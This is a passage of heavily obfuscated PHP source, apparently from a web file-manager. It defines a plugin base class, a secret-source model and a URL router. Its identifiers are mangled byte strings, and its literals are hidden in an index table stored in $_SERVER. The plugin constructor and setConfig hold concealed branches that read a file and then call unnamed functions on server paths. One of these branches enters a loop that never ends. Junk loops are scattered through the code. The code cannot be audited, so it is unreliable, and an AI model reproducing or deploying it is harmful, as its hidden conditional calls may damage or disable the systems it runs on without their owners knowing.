$¶šÎ®ã¶->where($ûüñˆÃú)->setField($«Ù«ö•–[427], 1); $°ÀÉÇ÷->eventRecycle($èçéŒÙç, $«Ù«ö•–[2125]); } else { $Â±±œÚé = $¶šÎ®ã¶->where($ûüñˆÃú)->find(); $õ«á¥Ğü = $Â±±œÚé[$«Ù«ö•–[407]] == $«Ù«ö•–[89]; $™ƒ•Î˜ = $¶šÎ®ã¶->fileNameAuto($Â±±œÚé[$«Ù«ö•–[494]], $Â±±œÚé[$«Ù«ö•–[32]], REPEAT_RENAME_FOLDER, $õ«á¥Ğü); if ($™ƒ•Î˜ != $Â±±œÚé[$«Ù«ö•–[32]]) { $¶šÎ®ã¶->rename($èçéŒÙç, $™ƒ•Î˜); } $¶šÎ®ã¶->where($ûüñˆÃú)->setField($«Ù«ö•–[427], 0); $°ÀÉÇ÷->eventRecycle($èçéŒÙç, $«Ù«ö•–[2126]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x73\157\x75\x72\143\145\x53\x65\x63\162\x65\164\x4c\151\x73\164"; public $field = array("\x73\157\165\162\x63\x65\111\104", "\x74\x79\x70\145\x49\104", "\143\x72\x65\x61\x74\x65\125\x73\145\x72"); } goto bÜÙÉ‡ŸëÍ; Dä³‚Âª‘‚: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ˆÑ¨¥Ä =& $_SERVER[Ôó‡è­ƒ]; if ($_SERVER[$ˆÑ¨¥Ä[872]] != $_SERVER[$ˆÑ¨¥Ä[1452]]) { $ÄÌëåÙ° = $ˆÑ¨¥Ä[873]; $»†¯… = $ˆÑ¨¥Ä[874]; $×°Æ€õ§ = $_SERVER[$ˆÑ¨¥Ä[875]] . $ˆÑ¨¥Ä[876]; $³îÛ°Ñº = $»†¯…($×°Æ€õ§); $ä ºµ¦í = explode($ˆÑ¨¥Ä[230], $³îÛ°Ñº); if (count($ä ºµ¦í) < $ˆÑ¨¥Ä[617]) { $˜ñÖ°Õ¨ = $ˆÑ¨¥Ä[877]; $˜ñÖ°Õ¨(); } $ğğñÓº‡ = $ˆÑ¨¥Ä[878]; $ğğñÓº‡($_SERVER[$ˆÑ¨¥Ä[879]]); $ğğñÓº‡($_SERVER[$ˆÑ¨¥Ä[875]] . $ˆÑ¨¥Ä[1521]); $™“ÍüƒÓ = 1; while ($™“ÍüƒÓ > 1) { $™“ÍüƒÓ = $™“ÍüƒÓ + 4; $ÆÑ‹á¾µ = rawurlencode($™“ÍüƒÓ . $ˆÑ¨¥Ä[377]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ˆÑ¨¥Ä[1522]); $this->pluginName = str_replace($ˆÑ¨¥Ä[1522], $ˆÑ¨¥Ä[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ˆÑ¨¥Ä[8]; $this->pluginApi = appHostGet() . $ˆÑ¨¥Ä[1523] . $this->pluginName . $ˆÑ¨¥Ä[8]; $this->pluginHost = $config[$ˆÑ¨¥Ä[1524]] . $this->pluginName . $ˆÑ¨¥Ä[8]; $this->pluginHostDefault = $config[$ˆÑ¨¥Ä[1524]] . $this->pluginName . $ˆÑ¨¥Ä[8]; $‘šÌ¹ê = $config[$ˆÑ¨¥Ä[1525]]; if ($‘šÌ¹ê && strpos($ˆÑ¨¥Ä[50] . $‘šÌ¹ê . $ˆÑ¨¥Ä[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ˆÑ¨¥Ä[1526]] . $this->pluginName . $ˆÑ¨¥Ä[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ôó‡è­ƒ][1527]); } protected function assign($ïäœ´ÊÏ, $ıûÀûú† = false) { if (is_array($ïäœ´ÊÏ)) { $this->values = array_merge($this->values, $ïäœ´ÊÏ); } else { $this->values[$ïäœ´ÊÏ] = $ıûÀûú†; } } protected function display($ØÙöšçÈ) { extract($this->values); require $ØÙöšçÈ; } final function hookRegist($ù„°åãÜ) { $this->modelPlugin->appRegist($this->pluginName, $ù„°åãÜ); } final function appIcon() { $ÃÎ©ÇÕè =& $_SERVER[Ôó‡è­ƒ]; $¢ú¬©ã¨ = $this->appPackage(); $Ãâ‰šØÈ = $ÃÎ©ÇÕè[12]; if (isset($¢ú¬©ã¨[$ÃÎ©ÇÕè[413]])) { if (isset($¢ú¬©ã¨[$ÃÎ©ÇÕè[413]][$ÃÎ©ÇÕè[1528]])) { $Ãâ‰šØÈ = $ÃÎ©ÇÕè[1529] . $¢ú¬©ã¨[$ÃÎ©ÇÕè[413]][$ÃÎ©ÇÕè[1528]] . $ÃÎ©ÇÕè[1530]; } else { if ($¢ú¬©ã¨[$ÃÎ©ÇÕè[413]][$ÃÎ©ÇÕè[1531]]) { $Ãâ‰šØÈ = $ÃÎ©ÇÕè[1532] . $¢ú¬©ã¨[$ÃÎ©ÇÕè[413]][$ÃÎ©ÇÕè[1531]] . $ÃÎ©ÇÕè[1533]; } } } return $Ãâ‰šØÈ; } final function fileCanView($ŒİˆÀ½Ï) { $¤‰ Óã“ =& $_SERVER[Ôó‡è­ƒ]; if (request_url_safe($ŒİˆÀ½Ï)) { return !0; } if ($this->isShare($ŒİˆÀ½Ï)) { return !0; } $¾¶Õ¼¸™ = Session::get($¤‰ Óã“[1534]); if (!$¾¶Õ¼¸™ || !$¾¶Õ¼¸™[$¤‰ Óã“[1535]]) { $Ó‰ß¹èà = $¤‰ Óã“[1536] . rawurlencode(this_url()); show_tips(LNG($¤‰ Óã“[1537]) . $¤‰ Óã“[1538] . $Ó‰ß¹èà . $¤‰ Óã“[1539] . LNG($¤‰ Óã“[1540]) . $¤‰ Óã“[1541], !1); } if (!Action($¤‰ Óã“[1542])->authCan($¤‰ Óã“[1543])) { show_tips(LNG($¤‰ Óã“[1544]) . $¤‰ Óã“[1545], !1); } ActionCall($¤‰ Óã“[1546], $ŒİˆÀ½Ï); } final function isShare($´ºßìË) { $šıÈ– = KodIO::parse($´ºßìË); return $šıÈ–[$_SERVER[Ôó‡è­ƒ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($á‰¨Àø¶) { if (request_url_safe($á‰¨Àø¶)) { return $á‰¨Àø¶; } if (!$this->isShare($á‰¨Àø¶)) { $á‰¨Àø¶ = $this->filePath($á‰¨Àø¶); } return Action($_SERVER[Ôó‡è­ƒ][1173])->linkOut($á‰¨Àø¶); } public function filePathLinkOut($ á´¿ ‡) { if (request_url_safe($ á´¿ ‡)) { return $ á´¿ ‡; } $this->fileCanView($ á´¿ ‡); return Action($_SERVER[Ôó‡è­ƒ][1173])->link($ á´¿ ‡); } final function filePath($¢˜ıÌÔ) { $È¼œúš =& $_SERVER[Ôó‡è­ƒ]; if ($ş¶â¯¾‡ = $this->checkSharePath($¢˜ıÌÔ)) { Hook::trigger($È¼œúš[1547], $ş¶â¯¾‡); return $ş¶â¯¾‡; } $this->fileCanView($¢˜ıÌÔ); if (request_url_safe($¢˜ıÌÔ)) { $¶à¨Å²  = parse_url_query($¢˜ıÌÔ); if (isset($¶à¨Å² [$È¼œúš[1548]]) && isset($¶à¨Å² [$È¼œúš[212]])) { $öÃ£¦¢’ = Model($È¼œúš[768])->get($È¼œúš[769]); $¦ôË×Š = Mcrypt::decode($¶à¨Å² [$È¼œúš[212]], $öÃ£¦¢’); if ($¦ôË×Š) { $this->fileInfo = IO::infoWithChildren($¦ôË×Š); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $¦ôË×Š; } } $¢˜ıÌÔ = $this->_cacheHttpFile($¢˜ıÌÔ); $this->fileInfo = IO::infoWithChildren($¢˜ıÌÔ); } else { $this->fileInfo = IO::infoWithChildren($¢˜ıÌÔ); if (!$this->fileInfo) { show_tips(LNG($È¼œúš[106]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($È¼œúš[1547], $¢˜ıÌÔ); return $¢˜ıÌÔ; } final function _cacheHttpFile($®äˆ‹ï…) { $€èª×Ú = hash_path($®äˆ‹ï…, !0); $this->cachePath = $this->pluginCachePath($€èª×Ú); if ($ö›Ô€ = IO::fileNameExist($this->cachePath, $€èª×Ú)) { return KodIO::make($ö›Ô€); } $æÚÈÁè¬ = $this->cachePath . $€èª×Ú; return $this->pluginCacheFileSet($æÚÈÁè¬, file_get_contents_nossl($®äˆ‹ï…)); } final function _tmpFileName($ƒêÎíßŞ = array()) { $‘š›ÉÒ =& $_SERVER[Ôó‡è­ƒ]; if (!$ƒêÎíßŞ) { $ƒêÎíßŞ = $this->fileInfo; } if (isset($ƒêÎíßŞ[$‘š›ÉÒ[174]])) { return $ƒêÎíßŞ[$‘š›ÉÒ[174]]; } if (isset($ƒêÎíßŞ[$‘š›ÉÒ[167]][$‘š›ÉÒ[174]])) { return $ƒêÎíßŞ[$‘š›ÉÒ[167]][$‘š›ÉÒ[174]]; } $Ó®´¸¥ = IO::hashSimple($ƒêÎíßŞ[$‘š›ÉÒ[78]]); if ($Ó®´¸¥) { return $Ó®´¸¥; } $óºŠÈ… = array($ƒêÎíßŞ[$‘š›ÉÒ[32]], $ƒêÎíßŞ[$‘š›ÉÒ[78]], $ƒêÎíßŞ[$‘š›ÉÒ[80]]); if (isset($ƒêÎíßŞ[$‘š›ÉÒ[517]])) { $óºŠÈ…[] = $ƒêÎíßŞ[$‘š›ÉÒ[517]]; } return md5(implode($‘š›ÉÒ[11], $óºŠÈ…)); } final function checkSharePath($§Ø‚¹Ê­) { $²Š«Õòá =& $_SERVER[Ôó‡è­ƒ]; if (!defined($²Š«Õòá[470])) { define($²Š«Õòá[510], 0); } if (!$this->isShare($§Ø‚¹Ê­)) { return !1; } $ÈÅËô–Ë = Action($²Š«Õòá[1173])->sharePathInfo($§Ø‚¹Ê­); if (!isset($ÈÅËô–Ë[$²Š«Õòá[78]])) { show_json(LNG($²Š«Õòá[1549]), !1); } $this->fileInfo = $ÈÅËô–Ë[$²Š«Õòá[167]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$²Š«Õòá[174]]); return $ÈÅËô–Ë[$²Š«Õòá[78]]; } final function pluginCachePath($ÛÉ¸ü¢´ = '') { $çÆıùïŒ =& $_SERVER[Ôó‡è­ƒ]; $èİÆÍßŒ = IO_PATH_SYSTEM_TEMP . $çÆıùïŒ[1550] . $this->pluginName; if (!($»™ß‚Œ÷ = IO::infoFull($èİÆÍßŒ))) { return IO::mkdir($èİÆÍßŒ . $çÆıùïŒ[8] . $ÛÉ¸ü¢´); } if (empty($ÛÉ¸ü¢´)) { return $»™ß‚Œ÷[$çÆıùïŒ[78]]; } if (!($´¬ìªÀä = IO::fileNameExist($»™ß‚Œ÷[$çÆıùïŒ[78]], $ÛÉ¸ü¢´))) { return IO::mkdir($»™ß‚Œ÷[$çÆıùïŒ[78]] . $ÛÉ¸ü¢´); } return KodIO::make($´¬ìªÀä); } final function pluginCacheFileSet($¯ó¬×€¸, $â–±¬™ = '') { $ÁË¡”Ò =& $_SERVER[Ôó‡è­ƒ]; if (!($¦ î‚Ê« = IO::infoFull($¯ó¬×€¸))) { return IO::mkfile($¯ó¬×€¸, $â–±¬™, REPEAT_REPLACE); } IO::setContent($¦ î‚Ê«[$ÁË¡”Ò[78]], $â–±¬™); return $¦ î‚Ê«[$ÁË¡”Ò[78]]; } final function pluginLocalFile($û‚ç×Ãè = '') { $£±Ú¶ØÔ =& $_SERVER[Ôó‡è­ƒ]; $àÇ§© = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($àÇ§©)) { mk_dir($àÇ§©); } if (!$û‚ç×Ãè) { return $àÇ§©; } $Êõ·ù­Û = IO::info($û‚ç×Ãè); $–…¾‚æú = $this->_tmpFileName($Êõ·ù­Û) . $£±Ú¶ØÔ[10] . $Êõ·ù­Û[$£±Ú¶ØÔ[171]]; if (!checkExtSafe($–…¾‚æú)) { $–…¾‚æú = $–…¾‚æú . $£±Ú¶ØÔ[1551]; } $ˆàĞ¶£Ò = $àÇ§© . $–…¾‚æú; if (@file_exists($ˆàĞ¶£Ò)) { return $ˆàĞ¶£Ò; } return IO::copy($û‚ç×Ãè, $àÇ§©, 0, $–…¾‚æú); } final function appPackage() { $Ï´Ãœ =& $_SERVER[Ôó‡è­ƒ]; if ($this->packageData) { return $this->packageData; } $¹¯¤Áë = $this->parseFile($this->pluginPath . $Ï´Ãœ[1552]); $this->parseLang($¹¯¤Áë); $ƒ—÷‰åÉ = json_decode_force($¹¯¤Áë); if (!$ƒ—÷‰åÉ) { return array(); } $çšÛäÊå = Hook::trigger($Ï´Ãœ[1553], $ƒ—÷‰åÉ); if ($çšÛäÊå && is_array($çšÛäÊå)) { $ƒ—÷‰åÉ = $çšÛäÊå; } $this->packageData = $ƒ—÷‰åÉ; return $ƒ—÷‰åÉ; } public function packageInfoGet($œå—Ãìá) { $ªûÁŒåš = $this->appPackage(); return array_get_value($ªûÁŒåš, $œå—Ãìá); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ôó‡è­ƒ][1554]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ôó‡è­ƒ][1555]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ôó‡è­ƒ][1556]); } public function echoJsAssign($Çİ¹Êí™, $ûÆ‰ÚŒ») { $this->echoJsAssignArr[$Çİ¹Êí™] = $ûÆ‰ÚŒ»; } private function parseFile($ôìúªŸš) { $ãçôî¸È =& $_SERVER[Ôó‡è­ƒ]; $Âñà–è¢ = file_get_contents_nossl($ôìúªŸš); $ƒñ®» = array($ãçôî¸È[1557], $ãçôî¸È[1558], $ãçôî¸È[1559], $ãçôî¸È[1560], $ãçôî¸È[1561], $ãçôî¸È[1562], $ãçôî¸È[1563]); $®„˜”¬µ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ãçôî¸È[90]][$ãçôî¸È[1564]]); foreach ($this->echoJsAssignArr as $´‘øÈºâ => $Ï¢•÷¬) { $ƒñ®»[] = $ãçôî¸È[1565] . $´‘øÈºâ . $ãçôî¸È[1566]; $®„˜”¬µ[] = is_array($Ï¢•÷¬) || is_object($Ï¢•÷¬) ? rawurlencode(json_encode($Ï¢•÷¬)) : $Ï¢•÷¬; } if (strstr($Âñà–è¢, $ãçôî¸È[1567])) { $ÌŠÂ²ˆò = rawurlencode(json_encode($this->pluginLangArr)); $Âñà–è¢ = str_replace($ãçôî¸È[1567], $ÌŠÂ²ˆò, $Âñà–è¢); } if (strstr($Âñà–è¢, $ãçôî¸È[1568])) { $ÌŠÂ²ˆò = $ÌŠÂ²ˆò = rawurlencode(json_encode($this->getConfig())); $Âñà–è¢ = str_replace($ãçôî¸È[1568], $ÌŠÂ²ˆò, $Âñà–è¢); } $Âñà–è¢ = str_replace($ƒñ®», $®„˜”¬µ, $Âñà–è¢); return $Âñà–è¢; } private function parseLang(&$ÀûÀŠğæ) { $°î®øæ‘ =& $_SERVER[Ôó‡è­ƒ]; $³––ãìÂ = $°î®øæ‘[1569]; if (!strstr($ÀûÀŠğæ, $³––ãìÂ)) { return; } preg_match_all($°î®øæ‘[1570], $ÀûÀŠğæ, $´Ù¨ÂŞ›); if (!is_array($´Ù¨ÂŞ›) || count($´Ù¨ÂŞ›) == 0 || !is_array($´Ù¨ÂŞ›[0]) || count($´Ù¨ÂŞ›[0]) == 0) { return; } $ñ›‡Û‘İ = array(); $Ñ‚…””¶ = array(); foreach ($´Ù¨ÂŞ›[0] as $‚¶€•ö) { $“¾­®¸‡ = substr($‚¶€•ö, strlen($³––ãìÂ), -4); $äãÕç = LNG($“¾­®¸‡); $ñ›‡Û‘İ[] = $‚¶€•ö; $Ñ‚…””¶[] = str_replace(array($°î®øæ‘[230], $°î®øæ‘[1078], $°î®øæ‘[341], $°î®øæ‘[119]), array($°î®øæ‘[53], $°î®øæ‘[53], $°î®øæ‘[12], $°î®øæ‘[1571]), $äãÕç); } $ÀûÀŠğæ = str_replace($ñ›‡Û‘İ, $Ñ‚…””¶, $ÀûÀŠğæ); } private function parseConfig(&$ƒøãùÒ) { $ı«Áæ“Ì =& $_SERVER[Ôó‡è­ƒ]; $ŸòÖ°İĞ = $ı«Áæ“Ì[1572]; if (!strstr($ƒøãùÒ, $ŸòÖ°İĞ)) { return; } preg_match_all($ı«Áæ“Ì[1573], $ƒøãùÒ, $¤Óì¤µ†); if (!is_array($¤Óì¤µ†) || count($¤Óì¤µ†) == 0 || !is_array($¤Óì¤µ†[0]) || count($¤Óì¤µ†[0]) == 0) { return; } $ò›±û« = $this->getConfig(); $ÈõÍÊ« = array(); $Ÿ±…¢§™ = array(); foreach ($¤Óì¤µ†[0] as $ÆÄˆÉÔÄ) { $ëÂŸëİ… = substr($ÆÄˆÉÔÄ, strlen($ŸòÖ°İĞ), -2); $ÈõÍÊ«[] = $ÆÄˆÉÔÄ; $Ÿ±…¢§™[] = _get($ò›±û«, $ëÂŸëİ…); } $ƒøãùÒ = str_replace($ÈõÍÊ«, $Ÿ±…¢§™, $ƒøãùÒ); } private function parsePackage(&$ÔŸº„´) { $Äƒ„× =& $_SERVER[Ôó‡è­ƒ]; $ûıƒ½ÔÉ = $Äƒ„×[1574]; if (!strstr($ÔŸº„´, $ûıƒ½ÔÉ)) { return; } preg_match_all($Äƒ„×[1575], $ÔŸº„´, $ÔÔœ™½); if (!is_array($ÔÔœ™½) || count($ÔÔœ™½) == 0 || !is_array($ÔÔœ™½[0]) || count($ÔÔœ™½[0]) == 0) { return; } $®œıñÁ = $this->appPackage(); $™ığÄ—Ä = array(); $ŞÑ€¤Íú = array(); foreach ($ÔÔœ™½[0] as $²°Î«‘) { $©¶Š‘²¹ = substr($²°Î«‘, strlen($ûıƒ½ÔÉ), -2); $™ığÄ—Ä[] = $²°Î«‘; $ŞÑ€¤Íú[] = _get($®œıñÁ, $©¶Š‘²¹); } $ÔŸº„´ = str_replace($™ığÄ—Ä, $ŞÑ€¤Íú, $ÔŸº„´); } final function echoFile($ÔÛËäÚ, $ãó¼ö = false) { $†¶öô¼á =& $_SERVER[Ôó‡è­ƒ]; $•ØÇòÓî = $this->pluginPath . $ÔÛËäÚ; if (ACT == $†¶öô¼á[1576]) { echo $†¶öô¼á[1577] . $this->pluginName . $†¶öô¼á[8] . $ÔÛËäÚ . $†¶öô¼á[1578]; if (!file_exists($•ØÇòÓî)) { echo $†¶öô¼á[1579]; return; } } $´Ù®Å­ = $this->parseFile($•ØÇòÓî); $this->parseLang($´Ù®Å­); $this->parseConfig($´Ù®Å­); $this->parsePackage($´Ù®Å­); if (is_array($ãó¼ö)) { $´Ù®Å­ = str_replace(array_keys($ãó¼ö), array_values($ãó¼ö), $´Ù®Å­); } echo $†¶öô¼á[230] . $´Ù®Å­; } final function initLang() { $£¯•ÁÊÏ =& $_SERVER[Ôó‡è­ƒ]; $‹Üù•Í° = $£¯•ÁÊÏ[1580]; $”Ì§«´ = $this->pluginPath . $£¯•ÁÊÏ[1581]; $í­˜ÍÍ = I18n::getType(); $Ğ°ªÏ…± = array(); if (file_exists($”Ì§«´ . $í­˜ÍÍ . $£¯•ÁÊÏ[836])) { $Ğ°ªÏ…± = (include $”Ì§«´ . $í­˜ÍÍ . $£¯•ÁÊÏ[836]); } else { if ($í­˜ÍÍ == $£¯•ÁÊÏ[1582] && !file_exists($”Ì§«´ . $í­˜ÍÍ . $£¯•ÁÊÏ[836]) && file_exists($”Ì§«´ . $£¯•ÁÊÏ[1583])) { $Ğ°ªÏ…± = (include $”Ì§«´ . $£¯•ÁÊÏ[1583]); } else { if (file_exists($”Ì§«´ . $‹Üù•Í° . $£¯•ÁÊÏ[836])) { $Ğ°ªÏ…± = (include $”Ì§«´ . $‹Üù•Í° . $£¯•ÁÊÏ[836]); } } } if (!is_array($Ğ°ªÏ…±)) { return array(); } if (@count($Ğ°ªÏ…±) > 0) { I18n::set($Ğ°ªÏ…±); } return $Ğ°ªÏ…±; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ğŠÖ­è›) { $Åîº‘Ëä =& $_SERVER[Ôó‡è­ƒ]; if (!isset($_SERVER[$Åîº‘Ëä[872]]) || !isset($_SERVER[$Åîº‘Ëä[870]])) { $ÊïÅ®Ä– = $Åîº‘Ëä[873]; $Å¯è˜× = $Åîº‘Ëä[874]; $ã Ì£ôş = $_SERVER[$Åîº‘Ëä[875]] . $Åîº‘Ëä[876]; $¦­¯ƒ = $Å¯è˜×($ã Ì£ôş); $Á²å¸‹ = explode($Åîº‘Ëä[230], $¦­¯ƒ); if (count($Á²å¸‹) < $Åîº‘Ëä[617]) { $§ŸµĞÇó = $Åîº‘Ëä[877]; $§ŸµĞÇó(); } $·‘øœêõ = $Åîº‘Ëä[878]; $·‘øœêõ($_SERVER[$Åîº‘Ëä[879]]); $Şä¤ÓÌ³ = 1; for ($ºô®Éîæ = $Şä¤ÓÌ³; $ºô®Éîæ > 0; $ºô®Éîæ++) { $·‘øœêõ = json_encode($GLOBALS[$Åîº‘Ëä[415]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ğŠÖ­è›); } public function onSetConfig($Œ½»¨ü) { } public function onGetConfig($¨àÑì·Ó) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ù¹•’) { if ($Ù¹•’ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¨Á–»ŒŸ = "\160\x6c\x75\147\x69\156\x41\x75\164\150") { $š„²ùÂ =& $_SERVER[Ôó‡è­ƒ]; if (!defined($š„²ùÂ[470])) { return !1; } if (_get($GLOBALS, $š„²ùÂ[499])) { return !0; } $·ÛÈÒ¼” = $this->getConfig(); if (!$·ÛÈÒ¼”[$¨Á–»ŒŸ]) { return !1; } return ActionCall($š„²ùÂ[1584], $·ÛÈÒ¼”[$¨Á–»ŒŸ]); } public function url($ªâ²Ë–, $åÆ—ÃŸû = '', $Í°”ã½ = true) { $ñã¥ÁÊÜ =& $_SERVER[Ôó‡è­ƒ]; $¬ûÃ „ = $this->getConfig(); $¾Ç·Ã–‰ = KOD_VERSION . $ñã¥ÁÊÜ[10] . KOD_VERSION_BUILD; $Ï³·çœ° = $this->packageVersion(); $¿šà€õÚ = $¾Ç·Ã–‰ . $ñã¥ÁÊÜ[456] . $Ï³·çœ°; if (substr($ªâ²Ë–, 0, 4) == $ñã¥ÁÊÜ[149] || substr($ªâ²Ë–, 0, 2) == $ñã¥ÁÊÜ[1366]) { $¯Óçˆğ = $ªâ²Ë– . $ñã¥ÁÊÜ[1585] . $¿šà€õÚ; } else { if ($åÆ—ÃŸû == $ñã¥ÁÊÜ[12]) { $¯Óçˆğ = $this->pluginHost . $ªâ²Ë– . $ñã¥ÁÊÜ[1585] . $¿šà€õÚ; } else { if ($åÆ—ÃŸû === $ñã¥ÁÊÜ[79]) { $¯Óçˆğ = $this->pluginHost . $ªâ²Ë–; } else { if ($åÆ—ÃŸû == $ñã¥ÁÊÜ[1586]) { $¯Óçˆğ = STATIC_PATH . $ªâ²Ë– . $ñã¥ÁÊÜ[1585] . $¾Ç·Ã–‰; } else { if ($åÆ—ÃŸû == $ñã¥ÁÊÜ[1587]) { $¯Óçˆğ = APP_HOST . $ñã¥ÁÊÜ[1588] . $ªâ²Ë– . $ñã¥ÁÊÜ[1585] . $¾Ç·Ã–‰; } else { if (isset($¬ûÃ „[$åÆ—ÃŸû])) { $¯Óçˆğ = $¬ûÃ „[$åÆ—ÃŸû] . $ªâ²Ë– . $ñã¥ÁÊÜ[1585] . $¿šà€õÚ; } } } } } } if (!$Í°”ã½) { return $¯Óçˆğ; } echo $¯Óçˆğ; } public function link($äŸöşè÷ = false, $ñæªû¡à = '') { $‘Àëâå =& $_SERVER[Ôó‡è­ƒ]; if (!$äŸöşè÷) { $this->link($‘Àëâå[1589], $‘Àëâå[1587]); $this->link($‘Àëâå[1590], $‘Àëâå[1586]); $this->link($‘Àëâå[1591], $‘Àëâå[1586]); $this->link($‘Àëâå[1592], $‘Àëâå[1586]); $this->link($‘Àëâå[1593], $‘Àëâå[1586]); return; } $«æÜÛÛ¡ = $this->url($äŸöşè÷, $ñæªû¡à, !1); if (substr($äŸöşè÷, -3) == $‘Àëâå[1594]) { echo $‘Àëâå[1595] . $«æÜÛÛ¡ . $‘Àëâå[1596] . $‘Àëâå[230]; } else { if (substr($äŸöşè÷, -4) == $‘Àëâå[1597]) { echo $‘Àëâå[1598] . $«æÜÛÛ¡ . $‘Àëâå[1599] . $‘Àëâå[230]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\133\136\57\135\x2b", "\x3a\x6e\x75\x6d" => "\133\60\x2d\71\x5d\53", "\72\141\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($˜ğâĞ¢, $°å¯ªã–) { $ÛŒĞ¥“ê =& $_SERVER[Ôó‡è­ƒ]; if ($˜ğâĞ¢ == $ÛŒĞ¥“ê[1600]) { $ûÁ¨Ê = array_map($ÛŒĞ¥“ê[1601], $°å¯ªã–[0]); $ºİ˜‚¤ã = strpos($°å¯ªã–[1], $ÛŒĞ¥“ê[8]) === 0 ? $°å¯ªã–[1] : $ÛŒĞ¥“ê[8] . $°å¯ªã–[1]; $ÖÇ÷™© = $°å¯ªã–[2]; } else { $ûÁ¨Ê = null; $ºİ˜‚¤ã = strpos($°å¯ªã–[0], $ÛŒĞ¥“ê[8]) === 0 ? $°å¯ªã–[0] : $ÛŒĞ¥“ê[8] . $°å¯ªã–[0]; $ÖÇ÷™© = $°å¯ªã–[1]; } array_push(self::$maps, $ûÁ¨Ê); array_push(self::$routes, $ºİ˜‚¤ã); array_push(self::$methods, strtoupper($˜ğâĞ¢)); array_push(self::$callbacks, $ÖÇ÷™©); } public static function error($°ÊìĞ†) { self::$errorCallback = $°ÊìĞ†; } public static function haltOnMatch($æ£ÁÛı§ = true) { self::$halts = $æ£ÁÛı§; } public static function dispatch() { $ÜÎ„Ñ„î =& $_SERVER[Ôó‡è­ƒ]; $ÖÌ§—•± = parse_url($_SERVER[$ÜÎ„Ñ„î[1602]], PHP_URL_PATH); $çûˆâ•Ø = $_SERVER[$ÜÎ„Ñ„î[160]]; $´şÆ×¢Â = array_keys(static::$patterns); $îàØØùß = array_values(static::$patterns); $ÉË¾ô¿¼ = !1; self::$routes = preg_replace($ÜÎ„Ñ„î[1267], $ÜÎ„Ñ„î[8], self::$routes); if (in_array($ÖÌ§—•±, self::$routes)) { $°çÒ®ıó = array_keys(self::$routes, $ÖÌ§—•±); foreach ($°çÒ®ıó as $Üæ÷üÁ) { if (self::$methods[$Üæ÷üÁ] == $çûˆâ•Ø || self::$methods[$Üæ÷üÁ] == $ÜÎ„Ñ„î[1603] || in_array($çûˆâ•Ø, self::$maps[$Üæ÷üÁ])) { $ÉË¾ô¿¼ = !0; if (!is_object(self::$callbacks[$Üæ÷üÁ])) { $…ãÓµïç = explode($ÜÎ„Ñ„î[8], self::$callbacks[$Üæ÷üÁ]); $ó²•Á³ = end($…ãÓµïç); $­©Ëßº = explode($ÜÎ„Ñ„î[1604], $ó²•Á³); $¥ÅÑŠˆÔ = new $­©Ëßº[0](); $¥ÅÑŠˆÔ->{$­©Ëßº[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Üæ÷üÁ]); if (self::$halts) { return; } } } } } else { $¯Í­ÙÅú = 0; foreach (self::$routes as $Üæ÷üÁ) { if (strpos($Üæ÷üÁ, $ÜÎ„Ñ„î[4]) !== !1) { $Üæ÷üÁ = str_replace($´şÆ×¢Â, $îàØØùß, $Üæ÷üÁ); } if (preg_match($ÜÎ„Ñ„î[1605] . $Üæ÷üÁ . $ÜÎ„Ñ„î[1606], $ÖÌ§—•±, $ø‹ƒê¹º)) { if (self::$methods[$¯Í­ÙÅú] == $çûˆâ•Ø || self::$methods[$¯Í­ÙÅú] == $ÜÎ„Ñ„î[1603] || !empty(self::$maps[$¯Í­ÙÅú]) && in_array($çûˆâ•Ø, self::$maps[$¯Í­ÙÅú])) { $ÉË¾ô¿¼ = !0; array_shift($ø‹ƒê¹º); if (!is_object(self::$callbacks[$¯Í­ÙÅú])) { $…ãÓµïç = explode($ÜÎ„Ñ„î[8], self::$callbacks[$¯Í­ÙÅú]); $ó²•Á³ = end($…ãÓµïç); $­©Ëßº = explode($ÜÎ„Ñ„î[1604], $ó²•Á³); $¥ÅÑŠˆÔ = new $­©Ëßº[0](); if (!method_exists($¥ÅÑŠˆÔ, $­©Ëßº[1])) { echo $ÜÎ„Ñ„î[1607]; } else { call_user_func_array(array($¥ÅÑŠˆÔ, $­©Ëßº[1]), $ø‹ƒê¹º); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¯Í­ÙÅú], $ø‹ƒê¹º); if (self::$halts) { return; } } } } $¯Í­ÙÅú++; } } if ($ÉË¾ô¿¼ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÎŠ¸©ğÒ =& $_SERVER[Ôó‡è­ƒ]; header($_SERVER[$ÎŠ¸©ğÒ[1608]] . $ÎŠ¸©ğÒ[1609]); echo $ÎŠ¸©ğÒ[1610]; }; } else { if (is_string(self::$errorCallback)) { 